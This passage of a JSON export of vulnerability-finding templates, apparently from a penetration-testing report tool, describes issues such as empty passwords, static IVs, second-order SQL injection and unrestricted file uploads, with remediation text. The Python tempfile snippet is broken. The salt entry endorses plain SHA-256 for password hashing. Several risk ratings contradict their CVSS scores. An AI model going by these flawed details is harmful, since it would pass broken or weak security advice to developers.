09:25:18","approved":1,"v_likelihood":"Minimal","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":682,"plugin_id":null,"title":"Empty Password","type":null,"description":"The application allows users to set empty (0-character length) account passwords or connects to other systems using credentials with an empty password. The security of any resource protected by such credentials is reduced to the privacy of the username alone, since an attacker need only guess the username to successfully authenticate. Since many systems use a pattern or easily guessed piece of information to set usernames (such as the user's email address), the username alone is not sufficient protection.\n","poc":null,"impact":"An attacker who guesses or otherwise obtains a username set with an empty password needs no further information to authenticate and impersonate the victim in the application or system. This grants the attacker access to all data and functionality the compromised credentials protect.\n","remediation":"Always require strong passwords for authentication to prevent unauthorized access to user accounts. The following guidelines outline a general methodology for setting a strong password policy.\nA strong password policy is one which combines rules to prevent easily-guessable passwords from being used while also ensuring that passwords contain sufficient entropy. A password policy which provides a large set of restrictions will ultimately result in a smaller potential pool of passwords, lowering the amount of time necessary to guess a password through brute-force attacks. Conversely, an overly permissive policy allows users to create easily-guessable passwords. Constraints should be put in place to prevent users from choosing easily-guessable passwords at the time of creation, specifically those that are targeted by well-known dictionary attacks. This will minimize the likelihood that an attack will be successful if an attacker attempts to guess commonly-used passwords or employs an automated dictionary attack against a particular user.\nIn the event that company policy does not stipulate password requirements, or the existing requirements are weak, consider employing the following password complexity requirements:\n--Passwords must be at least nine (9) characters long.\n--Passwords must contain some combination of at least three (3) of the following classes of characters: lowercase, uppercase, numeric, and \"special\" (e.g., !, @, #, $, %, ^, etc.) characters.\n--Passwords should not be a dictionary word in any language, slang, dialect, jargon, etc.\n--Passwords should not be based on personal information, etc.\n\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:18","updated_at":"2018-11-12 09:25:18","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":683,"plugin_id":null,"title":"Least Privilege Violation - Roles with Unnecessary Access","type":null,"description":"The application violates the principle of least privilege by granting unnecessary permissions to certain users or user types. The principle of least privilege requires that users operate with the minimum set of permissions necessary to perform activities corresponding to their role. In other words, if a user role does not require a particular entitlement, the role should not have it.\n","poc":null,"impact":"A user whose designated role is granted unnecessary privileges can perform operations that are not allowed or expected. In the benign case, this may have unintended consequences since users may perform actions they were not expected to perform.\nAn attacker who compromises such an account may exploit this access to further elevate their privileges. For example, if a \"read-only\" user is mistakenly granted the ability to modify application data, an attacker who compromises this account can also modify application data.\n","remediation":"The application must properly implement the least privilege principle. This can be done by defining application roles carefully. Ensure that each role is granted only the permissions required for the legitimate activities associated with that role.\n","cvss_base_score":6,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:S/C:P/I:P/A:P)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:18","updated_at":"2018-11-12 09:25:18","approved":1,"v_likelihood":"High","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":684,"plugin_id":null,"title":"Use of Static Initialization Vector (IV)","type":null,"description":"The application uses a static initialization vector to set the initial state of a block cipher encryption algorithm. An initialization vector is a unique, random value of length equal to the block size of a block cipher. Initialization vectors are used to vary the output of an encryption function so that, assuming the encryption key remains the same, encrypting the same plaintext multiple times never produces the same ciphertext. This prevents dictionary and chosen-plaintext attacks, which rely on the ciphertext for a given plaintext always being the same.\n","poc":null,"impact":"The use of a static initialization vector may result in the exposure of sensitive data through a \"chosen ciphertext\" or \"chosen plaintext\" attack against the ciphertext. An attacker who sees data encrypted using a static initialization vector may be able to detect patterns in the underlying plaintext that leak information about the encrypted data. If the same block of ciphertext appears several times, this observer can reasonably assume that the corresponding plaintext blocks are the same.\nIf an attacker knows the plaintext blocks corresponding to some ciphertext blocks (by choosing the plaintext and observing the ciphertext), he or she knows the plaintext whenever those ciphertext blocks appear, and can attempt to deduce the remaining parts of the message. In addition, if an attacker is able to intercept encrypted messages, he or she can tamper with data using chosen known blocks of ciphertext.\n","remediation":"The application should use unique, cryptographically secure random values as initialization vectors. Use a cryptographically secure pseudorandom number generator (\"CSPRNG\"), such as Java's SecureRandom class, with an unpredictable seed to ensure that the random values needed by the application cannot be predicted by an attacker. Some standardized CSPRNGs are described in NIST SP 800-90A and ANSI X8.82 Part 3. See NIST SP 800-90B for guidance on entropy sources for seed generation.\nIt is not important for initialization vectors to be kept secret, so they may be stored or transmitted in the clear with the ciphertext. It is important, however, that a given initialization vector never be reused when encrypting data using the same encryption key.\n","cvss_base_score":7.1,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:H/Au:N/C:C/I:C/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:18","updated_at":"2018-11-12 09:25:18","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":685,"plugin_id":null,"title":"Trust Boundary Violation","type":null,"description":"The application does not maintain distinct boundaries between trusted and untrusted data, resulting in a trust boundary violation. A trust boundary represents the limits on what data is considered vetted and sanitized within a given trust zone. Each trust zone only views data within itself as trusted; all data originating outside of the current trust zone is considered untrusted (tainted). Note that all data must be converted into trusted data before it crosses the trust boundary into the application.\nFor example, a web application server's trust zone is the application itself running on the server. Data entering from HTTP requests or any socket connections exist outside of the application's trust zone. By mixing untrusted and trusted data in the same data structure, the application taints that data structure and it can no longer be considered trusted.\nA session object can serve as a good example for a trust boundary. A session object usually contains trusted data pertaining to an authenticated user such as the user's ID or account number. This trusted data source becomes untrusted when the web application dynamically populates it with values coming from an untrusted source such as user input.\n","poc":null,"impact":"Trust boundary violations encourage developers to treat untrusted data as trusted. Because potentially malicious data has been placed in a data structure that is typically considered trusted, other sections of the application treating that structure as a black box may not validate that data before use. This can result in a variety of issues such as injection attacks, privilege escalation, and remote code execution.\nFor example, consider an application that accepts a username as a parameter and places it directly into the session object as an attribute. If this data is printed directly to the user interface later, it will be vulnerable to cross-site scripting. If this data is used in a database query, the application will be vulnerable to SQL injection.\n","remediation":"The application must always validate data crossing a trust boundary before use in application logic or storage in trusted data structures. Whitelist validation should be favored first over other validation techniques since any character or string not explicitly specified as part of the \"known-safe\" set of characters or values is rejected or removed by default. If a sufficient whitelist pattern cannot be determined, blacklist validation can be implemented to provide some protection by filtering out or rejecting inputs that contain specified characters.\nIn some cases, characters considered dangerous if handled by the application in certain ways may be part of an input's expected format. Separate security controls will need to be implemented in such cases to protect against certain attacks. Consider the following examples:\n--Application users may have a legitimate need to include characters that, in certain combinations, can be interpreted as HTML and JavaScript code by an end-user's browser. In this situation, these characters cannot be filtered; instead, the application must encode these characters for the appropriate output context.\n--The application may allow users to include single-quotes in a name field, but single-quotes may affect how SQL queries are executed if the input is concatenated to a static query string. In this case, correctly utilizing parameterized queries sufficiently protects against SQL injection attacks.\n\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:18","updated_at":"2018-11-12 09:25:18","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":686,"plugin_id":null,"title":"Insecure Salt Used","type":null,"description":"The application uses an insecure salting method when hashing user passwords. A salt is a random, unique, fixed-length token added to a value during hashing. Appending a salt to a value prior to hashing protects the list of hashes (e.g. passwords) from reverse lookup attacks by greatly increasing the complexity of building a reverse lookup (\"rainbow\") table. Insecure salting methods include reusing salts, using a short or fixed salt value, and using cryptographically insecure salt generation functions.\nUsing an insecure salt greatly reduces or eliminates the salt's efficacy, regardless of the underlying reason for its weakness. The time and computing resources required to generate a reverse lookup table becomes feasible when salt values are insufficiently complex or a static salt is used when hashing all values in a set.\n","poc":null,"impact":"The exact consequence of using an insecure salt depends on what data is being protected and what purpose the hash serves. For example, passwords hashed and stored in a database are at risk of exposure when a weak or static salt is used to generate each hash. An attacker who gains access to the hashed passwords can use reverse look-up techniques to reverse the hashes and obtain users' passwords, ultimately compromising those accounts.\n","remediation":"Sensitive data stored using a one-way function should be combined with a securely-generated salt prior to being hashed. The salt should be generated using a cryptographically secure pseudo-random number generator, consisting of a fixed-length value with a minimum size of 32 bits. Unique salts should be generated and used for each piece of clear-text data being hashed. For defense-in-depth, hash the combination of salt value and clear-text data using a cryptographically secure hashing algorithm such as SHA-256. Once the data is salted and hashed, the hash and plaintext salt can be stored.\n","cvss_base_score":4,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:H/Au:N/C:C/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:18","updated_at":"2018-11-12 09:25:18","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":687,"plugin_id":null,"title":"Second Order SQL Injection","type":null,"description":"The application executes SQL queries generated by dynamically concatenating untrusted stored data to static SQL query strings. In this design, the application has no way of distinguishing SQL syntax from valid data inserted into the query, and any SQL syntax inserted will be interpreted and executed. This represents a second-order SQL injection vulnerability since the data concatenated to the static query is retrieved from a local data source where it was previously stored by the application. This differs from a typical SQL injection vulnerability, where untrusted data concatenated to static SQL query strings is drawn directly from client requests.\n","poc":null,"impact":"Second order SQL injection allows an attacker to modify the structure of a SQL query executed by the application. Depending on the type of SQL server in use, the attacker may be able to modify existing queries or append entirely new queries to the existing query. These values are stored in the database columns and can act as SQL commands in other parts of the application. The malicious values can build queries that access any portion of the database with the same entitlements that the database connection is granted, potentially leading to:\n--Loss of confidentiality when an attacker gains access to unauthorized information\n--Loss of integrity through modification of other users' information, log files, and any other sensitive information\n--Loss of availability when an attacker deletes other users' data, executes commands that take down the database server, or performs a denial of service attack that fills the database and subsequently exhausts the database server's storage\n--Authentication bypass through modification of SQL queries that verify a user's credentials\n--Authorization bypass from gaining access to or altering data in ways the application's business logic does not allow\n\n","remediation":"Rewrite all SQL queries constructed through dynamic concatenation and those calling stored procedures to use an injection-safe query mechanism such as prepared statements with strongly-typed parameterized queries. Most modern programming languages provide a feature called \"parameterized queries\" that allow user-supplied data to be inserted safely as values in dynamic SQL queries. Rather than construct the dynamic SQL query by concatenating user-supplied data to static SQL query string fragments, data values are identified in the query by parameter markers or variables. Dynamic data is then passed through a mechanism provided by SQL that prevents the supplied data from changing the meaning of the query.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:18","updated_at":"2018-11-12 09:25:18","approved":1,"v_likelihood":"Medium","v_impact":"Critical","steps_to_reproduce":null,"likelihood_text":null},{"id":688,"plugin_id":null,"title":"Unrestricted File Upload","type":null,"description":"An unrestricted file upload exists when an application allows users to upload files without proper validation. The application fails to properly validate files across four key factors including file extension, mime-type, size, and upload frequency. In addition, the application does not appear to scan uploaded files for known malware.\n","poc":null,"impact":"Failing to restrict file uploads affects the security of the operating environment in a number of ways. Attackers commonly use file upload functionality to upload viruses or malware onto trusted servers. In addition to spreading malware, attackers can upload source code files (.aspx and .jsp for example) which may be rendered as valid application pages to end users. Additionally, if users are able to upload files of any size or at any frequency, an attacker may abuse this functionality to exhaust the server's disk space.\n","remediation":"The application should validate uploaded files for type and size, and limit how often the user is able to perform uploads. The following validation should be performed:\n--If the application requires uploaded files to be of a specific type such as PDF, text, or Word Document, the application should validate that the extension is '.pdf', '.txt' or '.doc'.\n--The first four bytes of the file should be validated. These first few bytes are known as the file's 'Magic Number' and will uniquely identify the file type. For example all PDF files start with the byte-sequence '%PDF'.\n--An upper limit on file size should be enforced, as determined on a case-by-case basis. For instance, if a typical file upload is 10 MB, the application should reject files that are larger than 25 MB.\n--The final check should validate the frequency of file uploads. If the application detects a high frequency of file uploads from a single user, the application should prohibit the user from uploading files for a period of time.\n\n","cvss_base_score":6.8,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:L/Au:S/C:C/I:C/A:C)","cvss_temporal_vector":null,"risk_factor":"Critical","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:18","updated_at":"2018-11-12 09:25:18","approved":1,"v_likelihood":"High","v_impact":"Critical","steps_to_reproduce":null,"likelihood_text":null},{"id":689,"plugin_id":null,"title":"Missing or Broken Authorization Mechanism","type":null,"description":"The application does not check or incorrectly checks entitlements when a user attempts to access privileged resources or actions. Given that a user has already authenticated to the application, authorization checks exist to enforce what functions that user is allowed to access. These checks may be applied inconsistently, in the wrong locations, or may not exist at all. A common example of this is an application that relies on UI controls to prevent access to administrative functionality. Although the pages containing these functions are not visible in the UI, they are still accessible if the address is known.\n","poc":null,"impact":"A malicious user may exploit a broken authorization mechanism to perform actions or access resources they should not be able to access. This may manifest as either horizontal or vertical privilege escalation depending on the nature of the resource in question. Without a functioning authorization mechanism, confidentiality, data integrity, and application availability may all be affected if the resource compromised is relevant.\n","remediation":"Authorization should always be explicitly checked server-side to verify that the user making a request to view data or perform an action is authorized to do so. This may be as simple as checking that a user is authorized to view a particular page in the application or check that the user is authorized to perform an action overall. Many other more fine-grained situations may exist depending on the application context and the complexity of the business functionality. The following are some common situations where a more fine-grained authorization check is necessary:\n--A user may be authorized to perform an action, but only against certain entities involved in the transaction. For example, a user may be authorized to perform a funds transfer from one account to another, but they may only be authorized to access certain accounts. Authorization checks must be performed to verify that the user is authorized to make a funds transfer as well as verify that the user is authorized to perform that transaction using the supplied accounts.\n--A user may be authorized to view only data tied to their own account. For example, a retail banking customer may be authorized to view the details of each of their accounts at a particular bank, but may not be authorized to view the details of other users' accounts. Authorization checks must be performed to verify that the user is authorized to view account details as well as verify that the user is authorized to view the details of the account they have requested information for.\n\n","cvss_base_score":6.5,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:S/C:P/I:P/A:P)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:18","updated_at":"2018-11-12 09:25:18","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":690,"plugin_id":null,"title":"Application Emails Credentials","type":null,"description":"The application exposes user credentials in emails generated and sent by the application. Emails containing credentials pose a risk of exposure in transit and at rest in the user's inbox. This design may also indicate that credentials are stored server-side in a retrievable format, which violates password storage best practices and leaves credentials at further risk of exposure.\n","poc":null,"impact":"Credentials sent via email are exposed to an attacker with access to a user's email inbox. User credentials are also fully exposed over the network when sent in an email since emails are typically transmitted as clear text. An attacker able to monitor traffic sent between the application server and the recipient will be able to view the contents of the email, including the supplied user credentials. Credentials exposed via email can then be used to impersonate the user in the application.\n","remediation":"User credentials should not be distributed by email. Applications that implement password reset functionality should generate a link and send it to the user's address on file. The link should take the user to a page where they can reset the password. The link should be generated follow several guidelines:\n--The user should not be able to specify what email address the link is sent to.\n--The link should expire after one use.\n--The link should expire regardless of use after a small timeframe, typically no longer than 24 hours. The lapsed time before expiration should be set based on the sensitivity of the application's data and functionality.\n--The reset URL should be unpredictable and not derived from public information. This typically involves including a token of 128 bits or more, generated using a cryptographically secure pseudo-random number generator (CSPRNG).\n\n","cvss_base_score":7,"cvss_temporal_score":5.2,"cvss_vector":"(AV:N/AC:M/Au:S/C:C/I:P/A:N/E:U/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:18","updated_at":"2018-11-12 09:25:18","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":691,"plugin_id":null,"title":"Dynamic Class Loading","type":null,"description":"The application executes untrusted code by dynamically loading classes at runtime. Dynamic class loading provides the ability to install software components, such as jar files or DLLs, on demand. The code being loaded is often not part of the application's own corpus of code. For example, consider an application that loads a class at runtime from an internet source specified by untrusted user input. In this case, there is no way to know what the included code will do before it is actually executed.\n","poc":null,"impact":"An attacker may be able to force the application to load malicious classes at runtime. This can be accomplished in a number of ways. For example, if the application has a hardcoded reference to an external code source then that code source may potentially be manipulated. If the reference to the external code source comes from untrusted user input, any attacker-controlled source may be loaded into the application. Once this code is loaded, it is executed on the victim's system, running with the same privileges the user is assigned. The effect of running such code is limited only to the attacker's goals and the sensitivity of the data and level of network access the victim's system contains.\n","remediation":"The application should avoid using dynamic class loading. If dynamic class loading is essential, ensure that classes execute in a sandboxed environment. Control the access that these classes have to other packages and run them in their own threads. Ensure that classes in a package come from the same source. For example, the Sealed: true directive in a jar's Manifest.txt file ensures that the jar file is sealed and all classes in a package are from same source code.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:18","updated_at":"2018-11-12 09:25:18","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":692,"plugin_id":null,"title":"Verbose Error Messages (with Stack Trace)","type":null,"description":"The application generates error messages that include stack traces, which can reveal details about the application's implementation. Stack traces are typically provided by the environment when an application reaches an erroneous state and are used by developers as well as administrators to debug issues. As such, stack traces contain information about all of the open stack frames relating to and leading to the error. They typically include, but are not limited to: function names, parameters, the memory addresses of relevant data, line numbers in code, and class names.\n","poc":null,"impact":"Error messages that contain stack traces reveal application implementation and error condition details to end users. This may include (but is not limited to) information about application architecture and implementation, error conditions, and any third-party libraries in use. In addition, certain languages, such as Java and C#, allow the developer to customize the error messages printed with stack traces. These custom errors may leak additional information since custom errors can include a wide variety of additional information, such as personally identifiable information (PII), connection strings, and request parameters. All of this information is useful to an attacker seeking to develop more efficient, targeted attacks against the application.\n","remediation":"The application should display generic error messages to users, regardless of the type of error that has occurred. If post-mortem error analysis and debugging is necessary, error details can be logged through a secure logging mechanism, such as Log4j, log4net, log4php etc., rather than printed out to the user. A unique error identifier may be provided to the user and logged with the error details for easy correlation.\n","cvss_base_score":2.6,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:H/Au:N/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:18","updated_at":"2018-11-12 09:25:18","approved":1,"v_likelihood":"Medium","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":693,"plugin_id":null,"title":"Access to Critical Resources via Shallow Copy","type":null,"description":"The application provides access to critical or restricted resources by passing references rather than copies. This is called a \"shallow\" copy, where a new pointer to the same object in memory is instantiated, as opposed to a \"deep\" copy, where the object itself is duplicated in memory and a new pointer is created to reference the new object. By passing mutable object pointers to untrusted code, this untrusted code has access to the original instance of the referenced object even if this access is not intended.\n","poc":null,"impact":"Providing references to mutable private or protected fields gives untrusted code access to modify the original copies of these objects. This results in a loss of data integrity. Depending on the context in which these objects are used, this can lead to privilege escalation attacks, authentication bypass, injection attacks such as cross-site scripting or SQL injection, or any other of a variety of vulnerabilities resulting from this otherwise trusted data being modified unsafely.\n","remediation":"The application should provide a \"disposable\" copy of any mutable fields when passing those objects to untrusted code. This can be through the return value of any public accessor methods or through passing a copy of the object as a parameter to an untrusted function. Before performing these actions, copy constructors must be defined for all mutable classes and used to create disposable deep copies. These copies can then be used without running the risk of untrusted code modifying the original object.\n","cvss_base_score":1,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:H/Au:S/C:N/I:P/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:18","updated_at":"2018-11-12 09:25:18","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":694,"plugin_id":null,"title":"Java Format Race Condition","type":null,"description":"The application uses an instance of java.text.Format (or a similarly vulnerable descendant class) in such a way that multiple threads may attempt to use it at the same time. The Format class and its descendants are not implemented in a thread-safe manner. Using an instance of this class as a static field or singleton class-level member field can introduce a race condition, which is an application state where multiple threads attempt to execute the same block of code at the same time. Data structures that are shared between threads become ambiguous, as they may contain either thread's data or a combination of both, and the environment may schedule atomic operations in such a way that a thread may end up reading data intended for another thread. Descendant classes of java.text.Format include java.text.DateFormat, java.text.SimpleDateFormat, java.text.MessageFormat, java.text.NumberFormat, java.text.ChoiceFormat, and java.text.DecimalFormat.\n","poc":null,"impact":"Race conditions of this type can lead to resources and data being improperly shared across threads. For the Format class and its descendants, this means a loss of data confidentiality and integrity. Depending on the data being formatted or parsed, this can result in privacy violations, privilege escalation, or other further corruption of downstream processes using the affected data.\n","remediation":"The application should never share instances of the Format class or its descendants between threads. When using these classes in the context of a singleton class, instances should be declared at the method level rather than the class level. Additionally, static declarations must also be avoided. Java offers a wrapper class, ThreadLocal (java.lang.ThreadLocal), to ensure that separate threads use distinct instances of non-thread-safe classes. The class does this by creating local instances of the contained class for each new thread and managing access to those instances.\n","cvss_base_score":4,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:H/Au:N/C:P/I:P/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:18","updated_at":"2018-11-12 09:25:18","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":695,"plugin_id":null,"title":"Insecure configuration of Application Transport Security (iOS)","type":null,"description":"Exceptions are set in the application's declarative Application Transport Security (ATS) configuration that may enable insecure network communications. We found that the App Transport Security (ATS) is disabled on the domain by setting '{'NSAllowsArbitraryLoads': True}'. Disabling ATS can allow insecure communication with particular servers or allow insecure loads for web views or for media, while maintaining ATS protections elsewhere in your pp.\n Application Transport Security (ATS) was introduced by Apple in iOS 9 as a built-in utility for protecting network communications. Out of the box, ATS enforces a TLS configuration with the following criteria: \n-- Apps can only connect to servers using the TLS 1.2 protocol \n-- Apps can only connect to servers which provide strong ciphers (strong ciphers are described as AES128+ and SHA2+) \n-- Apps must connect to servers using Perfect Forward Secrecy (PFS) (note: Apple has stated that they'll allow exceptions for this, for now)\nDeclaring exceptions in the ATS configuration allows the application to communicate with servers over potentially insecure connections. An attacker able to monitor network traffic between the client and server may be able to read or modify traffic sent over such channels, gaining unauthorized access to sensitive data and functionality.","poc":"","impact":"","remediation":"To enforce ATS, the NSAllowArbitraryLoads must be set to No in Info.plist file. Additionally, the AllowArbitraryLoads must be set to No under App Transport Security Settings. ATS must be enabled globally and opt-out for certain domains, if necessary, could be configured in NSExceptionDomains section -- The recommendation is to fully comply with ATS requirements and no exceptions should be configured in NSExceptionDomains to achieve associated security benefits of ATS.","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:18","updated_at":"2019-01-16 06:22:30","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":"","likelihood_text":""},{"id":696,"plugin_id":null,"title":"Shared Temporary Directory Used","type":null,"description":"The application uses a shared directory to store temporary files. Shared temporary directories are often world-readable and world-writable and require more caution when they are used to store and retrieve data. Common examples of system-level shared temporary directories are /tmp and /var/tmp on Unix, and \"%USERPROFILE%\\AppData\\Local\\Temp\" on Windows, though custom directories may be used as well.\n","poc":null,"impact":"The consequence of using a shared temporary file directory depends largely on the temporary directory's permissions and the temporary file-naming scheme. If an attacker can control the names of temporary files being read or written, they may be able to read data from temporary files generated by other users, resulting in information leakage. The attacker may also modify another user's temporary files in an attempt to affect the victim's actions in either the application or elsewhere.\nTemporary files left in a world-readable temporary file directory may also be exposed to users outside of the application who gain access to the server file system through other means. This may also lead to information leakage and modifications made to temporary files in an attempt to affect an application user's behavior or deny them access to the data.\n","remediation":"The application should avoid using shared directories for temporary files or use a secure API to create temporary files. If a shared directory is to be used, the file provided must have an unpredictable and unique name. The file should be created with limited permissions to prevent unauthorized users from writing to it, and it should be opened in an atomic operation with exclusive access provided. Finally, the file should be deleted when the program exits.\n","cvss_base_score":4,"cvss_temporal_score":0,"cvss_vector":"(AV:A/AC:H/Au:S/C:P/I:P/A:P)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:18","updated_at":"2018-11-12 09:25:18","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":697,"plugin_id":null,"title":"Application Sets Insecure Permissions on File","type":null,"description":"The application sets permissions on a file that leaves the file world-readable, world-writable, or both. Any application or user with access to the file system can view the contents of a world-readable file, and any application or user with access to the file system can modify the contents of a world-writable file.\n","poc":null,"impact":"Setting insecure permissions on a file allows other applications and users in the same environment to view and modify its contents. An attacker may exploit this configuration to access unauthorized sensitive data in files generated by the application. An attacker may also insert malicious data into world-writable files in an attempt to bypass input validation present elsewhere in the application. This could lead to exploitation of business logic flaws and/or injection vulnerabilities such as SQL injection.\n","remediation":"The application should not set file permissions as world-readable or world-writable. If the application must share its data with other applications, the principle of least privilege should be used and only applications that need access to the file should be given permission.\n","cvss_base_score":3.2,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:L/Au:S/C:P/I:P/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:18","updated_at":"2018-11-12 09:25:18","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":698,"plugin_id":null,"title":"Insecure Temporary File Creation via Python mktemp Function","type":null,"description":"The application uses the \"mktemp\" method, a deprecated and insecure method for obtaining a temporary filename. When called, the method \"mktemp\" returns the absolute path name of a file that did not exist prior to calling the method. Since the \"mktemp\" method does not return a handle to the file, the application has no control over the file until it is opened by subsequent application code.\n","poc":null,"impact":"Since the application does not have immediate access to files generated using \"mktemp\", an attacker may be able to take control of the file before the application opens a handle to it. An attacker may insert malicious data into the temporary file in an attempt to bypass input validation present elsewhere in the application. This could lead to exploitation of business logic flaws and/or injection vulnerabilities such as SQL injection. An attacker may also create the file with insecure access permissions, allowing them to access the file after the application has written data to it. An attack could also result in a loss of availability if the attacker is able to link the temporary file to a separate critical file in the application or system and cause the application to overwrite it.\n","remediation":"The application should use a secure method for generating temporary files that opens the temporary file at the same time that the filename is provided. By performing these two actions as an atomic operation, the time-of-check/time-of-use conditions described above can be avoided.\nThe recommended method for Python is tempfile.NamedTemporaryFile. This method will return a file object in a secure manner:\n<pre><code class=\"python\">import tempfile tmp = NamedTemporaryFile(delete=false) </pre>\n","cvss_base_score":3.2,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:L/Au:S/C:P/I:P/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:19","updated_at":"2018-11-12 09:25:19","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":699,"plugin_id":null,"title":"Permanent Cookie Contains Sensitive Information","type":null,"description":"Sensitive session information such as user credentials or session tokens are stored in a permanent cookie on the client's computer. Permanent (Persistent) cookies are data that a web site presents to the client's web browser, tagged with an expiration date that typically results in the client browser persisting the cookie on local storage (e.g., the hard disk). This data will remain on the user's system and can be accessed by the site the next time the user browses the site, even across browser sessions.\n","poc":null,"impact":"Sensitive information stored in persistent cookies may be leaked to unauthorized users. If the system is shared between multiple users or a remote attacker manages to install malware on the system, an attacker may be able to access the stored cookie and obtain access to its information.\nThe impact to the user and the application will vary depending on the type of data stored in the persistent cookie:\n--An attacker who gains access to sensitive session information such as user credentials and session tokens may gain access to the victim's session and impersonate that user in the application\n--Leaking personally identifiable information about the victim may lead to identity theft\n\n","remediation":"Do not store sensitive information in persistent cookies. Session tracking information should be stored in session cookies that will expire once the session is over. This can be achieved by not setting the \"Expires\" field in the cookie, or by setting its expiration to a time in the past.\n","cvss_base_score":3.5,"cvss_temporal_score":2.7,"cvss_vector":"(AV:N/AC:M/Au:S/C:P/I:N/A:N/E:POC/RL:OF/RC:C/CDP:ND/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:19","updated_at":"2018-11-12 09:25:19","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":700,"plugin_id":null,"title":"Insecure Mako Templating Engine Used","type":null,"description":"The application utilizes the Mako templating engine, which does not output encode variable values before inserting them into an HTTP response. Ideally, a templating engine should encode all variable values by default. Without encoding provided by the templating engine, the application must manually encode all variable values before sending a response to the client.\n","poc":null,"impact":"Use of a templating engine that does not encode variable values by default may leave the application vulnerable 